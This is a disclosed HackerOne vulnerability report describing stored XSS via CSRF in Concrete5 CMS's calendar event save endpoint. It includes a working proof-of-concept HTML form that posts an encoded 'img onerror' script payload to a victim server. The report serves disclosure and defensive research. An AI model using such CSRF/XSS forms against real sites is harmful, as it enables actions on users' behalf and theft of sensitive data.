---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1102018'
original_report_id: '1102018'
title: Stored unauth XSS in calendar event via CSRF
weakness: Cross-site Scripting (XSS) - Stored
team_handle: concretecms
created_at: '2021-02-12T08:43:11.092Z'
disclosed_at: '2021-10-15T16:38:25.115Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 9
asset_identifier: https://github.com/concrete5/concrete5
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-stored
---

# Stored unauth XSS in calendar event via CSRF

## Metadata

- HackerOne Report ID: 1102018
- Weakness: Cross-site Scripting (XSS) - Stored
- Program: concretecms
- Disclosed At: 2021-10-15T16:38:25.115Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

** crayons **
##  Description
The `description` parameter in the scenario `/index.php/ccm/calendar/dialogs/event/add/save` is affected by Stored XSS due to lack of user supplied data filtration. Also in should be mentioned that this endpoint does not verify CSRF token `ccm_token`, which leads to an ability to perform CSRF attack using specially crafted web page.

## Testing setup :
Concrete5 CMS version: 8.5.4
PHP Version: 7.2.24

## Steps to reproduce
1) Login to your privileged account 
2) Create a web page containing following code (do not forget to change form action URL to your testing server)

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://<YOUR CONCRETE5 TESTING SERVER IP>/index.php/ccm/calendar/dialogs/event/add/save" method="POST">
      <input type="hidden" name="caID" value="1" />
      <input type="hidden" name="name" value="csrf&#95;xss" />
      <input type="hidden" name="description" value="&lt;img&#32;src&#61;x&#32;onerror&#61;alert&#40;document&#46;domain&#41;&gt;" />
      <input type="hidden" name="cID" value="0" />
      <input type="hidden" name="event&#95;repetitionSetID&#91;&#93;" value="1234" />
      <input type="hidden" name="event&#95;repetitionID&#95;1234" value="0" />
      <input type="hidden" name="event&#95;pdStartDate&#95;pub&#95;1234" value="2&#47;12&#47;21" />
      <input type="hidden" name="event&#95;pdStartDate&#95;1234" value="2021&#45;02&#45;12" />
      <input type="hidden" name="event&#95;pdStartDateSelectTime&#95;1234" value="11&#58;00am" />
      <input type="hidden" name="publishAction" value="approve" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

3) Open the web page from Step 2 in the same browser, where you have logged in account from step 1 and click "Submit request" button
4) Navigate to calendar tab select created event and click "Details".
5) After opening "details" XSS will fired

## Credits
This bug was found as a part of Solar Security CMS Reseach, with https://hackerone.com/d0bby, https://hackerone.com/wezery0, https://hackerone.com/silvereniqma in collaboration. Can you, please, add them to this report?

## Impact

Malicious attacker can potentially obtain sensitive information or make action on user behalf.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
